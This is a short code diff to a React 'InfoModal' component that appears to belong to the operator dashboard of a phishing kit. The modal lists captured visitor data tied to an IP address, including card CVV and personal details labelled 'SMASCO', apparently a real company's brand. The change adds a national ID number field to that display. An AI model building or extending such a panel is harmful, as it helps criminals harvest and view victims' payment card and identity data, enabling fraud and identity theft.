@@ -31,6 +31,7 @@ export default function InfoModal({ ip, user, onClose }) {
     ["CVV", user.cvv],
     // 🔹 SMASCO Info (from info.html)
     ["SMASCO - Full Name", user.fullname],
+    ["SMASCO - ID Number", user.IDNumber],
     ["SMASCO - Phone", user.phone],
     ["SMASCO - City", user.city],
     ["SMASCO - Service", user.service],
